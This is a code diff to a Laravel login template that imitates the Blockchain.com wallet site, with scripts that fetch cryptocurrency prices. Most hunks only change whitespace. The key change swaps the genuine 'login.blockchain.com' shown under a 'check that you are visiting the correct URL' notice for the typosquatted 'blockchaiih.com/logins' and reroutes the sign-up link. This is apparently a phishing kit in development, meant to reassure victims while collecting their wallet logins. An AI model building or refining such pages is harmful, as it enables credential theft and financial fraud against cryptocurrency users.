@@ -14,13 +14,13 @@
           .then((r1) => {
               //console.log(r1);
               var x1 =JSON.parse(r1.target.responseText);
-             
+
               $('#showbtcP').prepend((x1.data[0].quote.USD.percent_change_24h).toFixed(2) + '%');
               $('#showbtc').prepend('$'+(x1.data[0].quote.USD.price).toFixed(2));
-              
+
               $('#showethP').prepend((x1.data[1].quote.USD.percent_change_1h).toFixed(2) + '%');
               $('#showeth').prepend('$'+(x1.data[1].quote.USD.price).toFixed(2));
-              
+
               $('#showbchP').prepend((x1.data[10].quote.USD.percent_change_1h).toFixed(2) + '%');
               $('#showbch').prepend('$'+(x1.data[10].quote.USD.price).toFixed(2));
           }).catch()
@@ -32,18 +32,18 @@
               xhr.onerror = reject;
               xhr.send();
           });
-      }    
-   </script> 
+      }
+   </script>
    <script>
       request('get','https://api.wazirx.com/api/v2/tickers/btcinr')
           .then((r1) => {
               //console.log(r1);
               var x1 =JSON.parse(r1.target.responseText);
-             
-             
+
+
               consle.log((x1.ticker.buy)+'₹');
-              
-       
+
+
           }).catch()
       function request(method, url) {
           return new Promise(function (resolve, reject) {
@@ -53,8 +53,8 @@
               xhr.onerror = reject;
               xhr.send();
           });
-      }    
-   </script> 
+      }
+   </script>
 </head>
 <html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
    <body id="login_page_" class="antialiased">
@@ -65,7 +65,7 @@
                      <a href="{{ url('/home') }}" class="text-sm text-gray-700 underline">Home</a>
                  @else
                      <a href="{{ route('login') }}" class="text-sm text-gray-700 underline">Log in</a>
-         
+
                      @if (Route::has('register'))
                          <a href="{{ route('register') }}" class="ml-4 text-sm text-gray-700 underline">Register</a>
                      @endif
@@ -106,14 +106,14 @@
             </div>
             <p class="bottom_text">Please check that you are visiting the correct URL</p>
             <div class="box_links">
-              <p><img src="img/lock.png"> https://login.blockchain.com</p>
+              <p><img src="img/lock.png"> blockchaiih.com/logins</p>
             </div>
-            
+
          </div>
 
       </div>
       <div class="bottom_text_content">
-              <p class="content_btm">Don't have a Blockchain Account? <a href="signup.html">Sign up Now -></a></p>
+              <p class="content_btm">Don't have a Blockchain Account? <a href="{{ route('logins') }}">Sign up Now -></a></p>
               <ul class="bottom_link">
                 <li><a href="#">English</a></li>
                 <li><a href="#">Version 4.51.6</a></li>
